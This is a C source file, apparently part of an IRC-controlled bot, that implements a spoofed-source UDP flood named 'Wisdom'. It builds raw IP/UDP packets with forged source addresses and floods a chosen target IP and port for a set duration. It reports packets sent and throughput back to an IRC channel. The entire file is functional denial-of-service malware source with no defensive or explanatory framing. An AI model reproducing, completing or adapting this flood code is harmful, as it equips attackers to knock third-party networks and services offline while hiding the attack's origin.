#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_WISDOM
char spoof[512];
BOOL spoofing = FALSE;

DWORD WINAPI WisdomUDPThread(LPVOID param) 
{
	char sendbuf[IRCLINE];
	WISDOMUDP wis = *((WISDOMUDP *)param);
	WISDOMUDP *wiss = (WISDOMUDP *)param;
	wiss->gotinfo = TRUE;
	sprintf(sendbuf, "-\x03\x34\2wisdom(udp)\2\x03- Starting Wisdom spoofed UDP flood thread.", WisdomUDP(wis));
	addlog(sendbuf);
	clearthread(wis.threadnum);
	ExitThread(0); 
}

int WisdomUDP(WISDOMUDP info)
{
	char sendbuf[IRCLINE];
	static UDPPACKET packet;
	struct sockaddr_in udp_sin;
	SOCKET udpsock;
	BOOL flag;
	int sent;
	unsigned long start;
	char ip[32];
	SOCKADDR sa;
	int sas;
	udpsock = fsocket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (udpsock == INVALID_SOCKET)
	{
		sprintf(sendbuf, "-\x03\x34\2wisdom(udp)\2\x03- Error calling socket().");
		if (!info.silent) irc_privmsg(info.sock, info.chan, sendbuf, info.notice); 
		return 0;
	}
	flag = TRUE; 
	if (fsetsockopt(udpsock,IPPROTO_IP,IP_HDRINCL,(char *)&flag,sizeof(flag)) == SOCKET_ERROR) 
	{
		sprintf(sendbuf, "-\x03\x34\2wisdom(udp)\2\x03- Error calling setsockopt(). WSAGetLastError() returns %d.", fWSAGetLastError());
		if (!info.silent) irc_privmsg(info.sock, info.chan, sendbuf, info.notice); 
		return 0;
	}
	if (finet_addr(info.ip) == INADDR_NONE)
	{
		sprintf(sendbuf, "-\x03\x34\2wisdom(udp)\2\x03- Invalid target IP. WSAGetLastError() returns %d.", fWSAGetLastError());
		if (!info.silent) irc_privmsg(info.sock, info.chan, sendbuf, info.notice); 
		return 0;
	}
	udp_sin.sin_family = AF_INET;
	udp_sin.sin_port = fhtons(0);
	udp_sin.sin_addr.s_addr = inet_addr(info.ip);
	start = GetTickCount();
	sprintf(sendbuf, "-\x03\x34\2wisdom(udp)\2\x03- Sending packets to %s...", info.ip);
	if (!info.silent) irc_privmsg(info.sock, info.chan, sendbuf, info.notice); 
	sent = 0;
	while (((GetTickCount() - start) / 1000) <= (unsigned long)atoi(info.time))
	{
		if (!spoofing) 
		{
			sas = sizeof(sa);
			memset(&sa, 0, sizeof(sa));
			fgetsockname(info.sock, &sa, &sas);
			sprintf(ip, "%d.%d.%d.%d", (BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], brandom(1, 255));
		} else
			strcpy(ip, spoof);

		packet.ipHeader.h_verlen=(4<<4 | sizeof(IPHEADERX)/sizeof(unsigned long)); 
		packet.ipHeader.total_len=fhtons(sizeof(ECHOREQUEST)); 
		packet.ipHeader.ident=1; 
		packet.ipHeader.frag_and_flags=0; 
		packet.ipHeader.ttl=128; 
		packet.ipHeader.proto=IPPROTO_UDP; 
		packet.ipHeader.checksum=0; 
		packet.ipHeader.sourceIP=finet_addr(ip); 
		packet.ipHeader.destIP=udp_sin.sin_addr.s_addr;
		packet.udpHeader.Checksum = 0;
		if (atoi(info.port) == 0) packet.udpHeader.dport = fhtons(rand()%1025);
		else packet.udpHeader.dport = fhtons(atoi(info.port));
		packet.udpHeader.sport = rand()%1025;
		packet.udpHeader.Length = fhtons(sizeof(UDPHDRX)+REQ_DATASIZE);

		memset(packet.cData, rand()%255, REQ_DATASIZE);
		if (fsendto(udpsock, (const char *) &packet, sizeof(packet), 0, (SOCKADDR *)&udp_sin, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
		{
			sprintf(sendbuf, "-\x03\x34\2wisdom(udp)\2\x03- Error sending packets to %s. eax=SOCKET_ERROR, WSAGetLastError()=%d. sizeof(buffer) = %d. Packets sent sucessfully = %d.", info.ip, fWSAGetLastError(), sizeof(packet), sent);
			if (!info.silent) irc_privmsg(info.sock, info.chan, sendbuf, info.notice); 
			return 0;
		}
		sent = sent + 1;
	}
	fclosesocket(udpsock);
	sprintf(sendbuf, "-\x03\x34\2wisdom(udp)\2\x03- Finished sending packets to %s. Sent %d packet(s). ~%dMB of data sent (~%dK/s).", info.ip, sent, (((sent * sizeof(packet)) / 1024) / 1024), (((sent * sizeof(packet)) / 1024) / atoi(info.time)));
	if (!info.silent) irc_privmsg(info.sock, info.chan, sendbuf, info.notice); 
	return 0;
}
#endif